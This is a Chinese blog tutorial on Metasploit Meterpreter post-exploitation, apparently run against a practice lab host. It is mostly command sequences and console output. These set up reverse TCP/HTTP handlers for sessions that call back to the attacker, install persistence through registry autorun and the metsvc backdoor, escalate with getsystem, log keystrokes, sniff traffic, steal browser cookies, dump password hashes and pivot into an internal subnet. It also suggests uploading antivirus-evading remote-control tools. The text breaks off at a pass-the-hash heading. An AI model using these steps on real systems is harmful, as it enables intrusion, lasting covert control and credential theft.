<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="生活,旅行,思考,代码,博客" />
   
  <meta name="description" content="一生努力" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     0Rld
  </title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">

  
<script src="/js/pace.min.js"></script>


  

  

<link rel="alternate" href="/atom.xml" title="0Rld" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

</html>
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
<body>
  <div id="app">
    <main class="content">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover3.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">0Rld</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
        <img
          src="/images/ayer.svg"
          class="cover-logo"
          alt="0Rld"
        />
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    
    
    
    <article id="post-Metasploit" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/09/11/Metasploit/"
    >Metasploit</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/09/11/Metasploit/" class="article-date">
  <time datetime="2020-09-11T10:55:45.000Z" itemprop="datePublished">2020-09-11</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>主要介绍下Meterpreter攻击载荷模块</p>
<h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a><strong>1.常用命令</strong></h2><table>
<thead>
<tr>
<th align="center"><strong>background</strong></th>
<th align="center"><strong>将meterpreter隐藏在后台</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>sessions</strong></td>
<td align="center"><strong>查看已经成功获取的会话</strong></td>
</tr>
<tr>
<td align="center"><strong>quit</strong></td>
<td align="center"><strong>关闭meterpreter会话返回msf</strong></td>
</tr>
</tbody></table>
<p><strong><img src="/2020/09/11/Metasploit/1.png" alt></strong></p>
<h3 id="1-1文件系统命令"><a href="#1-1文件系统命令" class="headerlink" title="1.1文件系统命令"></a><strong>1.1文件系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>getwd</strong></th>
<th align="center"><strong>目标机当前的工作目录</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>getlwd</strong></td>
<td align="center"><strong>当前系统的工作目录</strong></td>
</tr>
<tr>
<td align="center"><strong>upload</strong></td>
<td align="center"><strong>上传文件到目标机器</strong></td>
</tr>
<tr>
<td align="center"><strong>download</strong></td>
<td align="center"><strong>从目标机器上下载文件（注意路径符号）</strong></td>
</tr>
<tr>
<td align="center"><strong>edit</strong></td>
<td align="center"><strong>调用vi对目标机的文件进行编辑</strong></td>
</tr>
<tr>
<td align="center"><strong>search  -h</strong></td>
<td align="center"><strong>文件搜索</strong></td>
</tr>
</tbody></table>
<p><img src="/2020/09/11/Metasploit/2.png" alt></p>
<h3 id="1-2-网络命令"><a href="#1-2-网络命令" class="headerlink" title="1.2 网络命令"></a><strong>1.2 网络命令</strong></h3><p><strong>portfwd是端口转发命令，假设3389只允许内网访问，可用此命令进行端口转发，从而能直接访问目标主机</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections <span class="number">1</span>  <span class="comment">#开启3389</span></span><br><span class="line">portfwd add <span class="literal">-l</span> <span class="number">1234</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.xx.xx</span><br><span class="line">root@kali:~/tools<span class="comment"># rdesktop -u admin -p 1234 127.0.0.1:1234</span></span><br><span class="line">route <span class="comment">#显示主机路由信息</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-系统命令"><a href="#1-3-系统命令" class="headerlink" title="1.3 系统命令"></a><strong>1.3 系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>ps</strong></th>
<th align="left"><strong>显示目标主机上的进程</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>migrate    304</strong></td>
<td align="left"><strong>可以将meterpreter会话从一个进程移植到另一个进程的内存空间（避免用户关闭进程终止会话连接，可以将进程移植到稳定的系统服务进程中，不需要断开已有的tcp连接） 这里的304是指进程的pid</strong></td>
</tr>
<tr>
<td align="center"><strong>getpid</strong></td>
<td align="left"><strong>获取当前会话所在进程的PID值</strong></td>
</tr>
<tr>
<td align="center"><strong>getuid</strong></td>
<td align="left"><strong>查看当前具有的权限</strong></td>
</tr>
<tr>
<td align="center"><strong>kill 1840</strong></td>
<td align="left"><strong>结束目标进程</strong></td>
</tr>
<tr>
<td align="center"><strong>sysinfo</strong></td>
<td align="left"><strong>查看目标系统信息</strong></td>
</tr>
<tr>
<td align="center"><strong>shutdown</strong></td>
<td align="left"><strong>关闭目标主机</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -f cmd.exe  #隐藏执行cmd.exe程序</span><br><span class="line">Process 2076 created.</span><br><span class="line">meterpreter &gt; execute -H -i -f   cmd.exe   #进行交互    </span><br><span class="line">Process 2740 created.                          </span><br><span class="line">Channel 1 created.                                                                     </span><br><span class="line">C:\&gt;whoami                                     </span><br><span class="line">execute -H -m -d normal.exe -f wce.exe -a "-o foo.txt" #wce.exe是攻击机上的可执行文件，后面是参数</span><br><span class="line"><span class="meta">#</span><span class="bash">-H 表示隐藏执行，-d 表示伪装在目标机器上的进程，-m支持直接从内存中执行攻击端的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="2-后渗透攻击模块"><a href="#2-后渗透攻击模块" class="headerlink" title="2.后渗透攻击模块"></a><strong>2.后渗透攻击模块</strong></h2><p>主要步骤如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http                                                                                                                               </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span>                                                                                                                                                   </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">1234</span>                                                                                                                              </span><br><span class="line">lport =&gt; <span class="number">1234</span>                                                                                                                                                             </span><br><span class="line">msf5 exploit(multi/handler) &gt; run                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">[*] Started HTTP reverse handler on http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span>                                                                                                            </span><br><span class="line">[*] http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> handling request from <span class="number">192.168</span>.<span class="number">126.151</span>; (UUID: fop9sg                                                                                       hd) Staging x86 payload (<span class="number">181337</span> bytes) ...                                                                                                                                </span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> -&gt; <span class="number">192.168</span>.<span class="number">126.151</span>:<span class="number">1087</span>) at <span class="number">2</span>                                                                                       <span class="number">020</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">29</span> +<span class="number">0800</span>                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">meterpreter &gt; arp<span class="literal">-a</span></span><br></pre></td></tr></table></figure>



<p>通过Persistence与metsvc等后渗透攻击模块，在目标主机上安装自启动和永久服务的方式，可以长久的控制目标主机！</p>
<h3 id="2-1-persistence后渗透攻击模块"><a href="#2-1-persistence后渗透攻击模块" class="headerlink" title="2.1 persistence后渗透攻击模块"></a><strong>2.1 persistence后渗透攻击模块</strong></h3><p>运行后，会在目标主机的注册表键中添加键值，达到自启动的目的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence <span class="literal">-X</span> <span class="literal">-i</span> <span class="number">5</span> <span class="literal">-p</span> <span class="number">443</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line"><span class="comment">#-X 表示开机自启动，-i表示反向连接的间隔时间</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf4/logs/persistence/STU1_20200912.<span class="number">0938</span>/STU1_20200912.<span class="number">0938</span>.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">126.33</span> LPORT=<span class="number">443</span></span><br><span class="line">[*] Persistent agent script is <span class="number">99613</span> bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[+] Agent executed with PID <span class="number">1832</span></span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.126.33</span><br><span class="line">lhost =&gt; 192.168.126.33</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.33:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.126.151</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.33:443 -&gt; 192.168.126.151:1440) at 2020-09-12 16:49:24 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : STU1</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : GOD</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-metsvc后渗透攻击模块"><a href="#2-2-metsvc后渗透攻击模块" class="headerlink" title="2.2 metsvc后渗透攻击模块"></a><strong>2.2 metsvc后渗透攻击模块</strong></h3><p>主要是在目标主机的31337端口开启后门监听服务，并上传3个meterpreter模块</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Creating a meterpreter service on port <span class="number">31337</span></span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\dpcuvwyl...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc<span class="literal">-server</span>.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">         * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>

<p>以上两个模块都容易被杀毒软件检测到，实用性不强，可上传免杀处理后的远程控制工具。</p>
<h3 id="2-3-权限提升"><a href="#2-3-权限提升" class="headerlink" title="2.3 权限提升"></a><strong>2.3 权限提升</strong></h3><p>getsysytem  命令集成了四种权限提升技术</p>
<p>分别利用了MS09-012和MS10-015、MS10-073、MS10-092中的漏洞 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/post/windows/escalate# ls</span><br><span class="line">droplnk.rb  getsystem.rb  golden_ticket.rb  ms10_073_kbdlayout.rb  screen_unlock.rb  unmarshal_cmd_exec.rb</span><br></pre></td></tr></table></figure>



<h3 id="2-4-信息获取"><a href="#2-4-信息获取" class="headerlink" title="2.4 信息获取"></a><strong>2.4 信息获取</strong></h3><p><strong>dumplink模块：获取目标主机最近的系统操作、访问文件和office文档的操作记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/dumplinks </span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Running as SYSTEM extracting user list...</span><br><span class="line">[*] Extracting lnk files <span class="keyword">for</span> user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\<span class="number">01</span>.靶场夺旗第一关.pdf.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Chapter_1L.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\lab.txt.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\malware.lnk.</span><br></pre></td></tr></table></figure>



<p><strong>enum_applications模块：获取目标主机安装的软件、安全更新与漏洞补丁的信息</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications </span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on STU1</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2017 X86 Minimum Runtime - 14.16.27033     14.16.27033</span><br><span class="line"> Mozilla Firefox 69.0.1 (x86 zh-CN)                              69.0.1</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Notepad++ (32-bit x86)                                          7.7.1</span><br><span class="line"> Npcap 0.9983                                                    0.9983</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20200912201743_default_192.168.126.151_host.application_539875.txt</span><br></pre></td></tr></table></figure>

<p><strong>获取键盘记录，从start开始记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">&lt;Left Windows&gt;ist mimi&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop </span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>



<h3 id="2-5-口令获取和利用"><a href="#2-5-口令获取和利用" class="headerlink" title="2.5 口令获取和利用"></a><strong>2.5 口令获取和利用</strong></h3><p><strong>通过网络嗅探获取，在post/windows/gather/credentials目录下有许多这一块的攻击模块</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer </span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces <span class="comment">#获取网卡</span></span><br><span class="line"><span class="number">1</span> - <span class="string">'WAN Miniport (Network Monitor)'</span> ( type:<span class="number">3</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"><span class="number">2</span> - <span class="string">'Intel(R) PRO/1000 MT Network Connection'</span> ( type:<span class="number">0</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start <span class="number">1</span></span><br><span class="line">[*] Capture started on interface <span class="number">1</span> (<span class="number">50000</span> packet buffer)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_dump <span class="number">1</span> /root/xp1.cap <span class="comment">#保存在本地，再用wireshark分析</span></span><br><span class="line">[*] Flushing packet capture buffer <span class="keyword">for</span> interface <span class="number">1</span>...</span><br><span class="line">[*] Flushed <span class="number">0</span> packets (<span class="number">0</span> bytes)</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /root/xp1.cap</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_stop <span class="number">1</span></span><br><span class="line">[*] Capture stopped on interface <span class="number">1</span></span><br><span class="line">[*] There are <span class="number">0</span> packets (<span class="number">0</span> bytes) remaining</span><br><span class="line">[*] Download or release them <span class="keyword">using</span> <span class="string">'sniffer_dump'</span> or <span class="string">'sniffer_release'</span></span><br></pre></td></tr></table></figure>

<p><strong>通过浏览器获取关键信息，如cookie、历史记录、密码等</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_ie </span><br><span class="line"></span><br><span class="line">[*] IE Version: <span class="number">8.0</span>.<span class="number">7601.17514</span></span><br><span class="line">[*] Retrieving history.....</span><br><span class="line">        File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat</span><br><span class="line">        File: </span><br><span class="line">[*] Looping through history to find autocomplete data....</span><br><span class="line">[-] No autocomplete entries found <span class="keyword">in</span> registry</span><br><span class="line">[*] Looking <span class="keyword">in</span> the Credential Store <span class="keyword">for</span> HTTP Authentication Creds...</span><br><span class="line">[*] Writing history to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.history_734619.txt</span><br><span class="line">[*] Writing cookies to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.cookies_282520.txt</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/smart_hashdump  <span class="comment">#获取系统口令的哈希值</span></span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one is connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/<span class="number">20200912210516</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_windows.hashes_975340.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key <span class="keyword">using</span> SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[*]     No users with password hints on this system</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>



<h3 id="2-6-内网拓展"><a href="#2-6-内网拓展" class="headerlink" title="2.6 内网拓展"></a><strong>2.6 内网拓展</strong></h3><p><strong>内网拓展功能，添加路由，将目标机器作为跳板机进入内网其它主机，有以下两种方式：</strong>                                                                                                                                                                                                                                                                                                                                                                                                                                   </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; route add <span class="number">192.168</span>.<span class="number">52.0</span> <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">3</span></span><br><span class="line">[*] Route added</span><br><span class="line">msf5 exploit(multi/handler) &gt; route print </span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">192.168</span>.<span class="number">52.0</span>       <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">3</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp </span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set rhosts <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; set ports <span class="number">445</span></span><br><span class="line">ports =&gt; <span class="number">445</span></span><br><span class="line">msf5 auxiliary(scanner/portscan/tcp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned  <span class="number">13</span> of <span class="number">128</span> hosts (<span class="number">10</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">25</span>:      - Scanned <span class="number">128</span> of <span class="number">128</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets </span><br><span class="line"></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span>.<span class="number">126.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">meterpreter &gt; run autoroute <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[*] Adding a route to <span class="number">192.168</span>.<span class="number">52.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br></pre></td></tr></table></figure>



<p><strong>利用获取的口令进行传递攻击，如果密码一致，就可成功返回meterpreter会话：</strong></p>
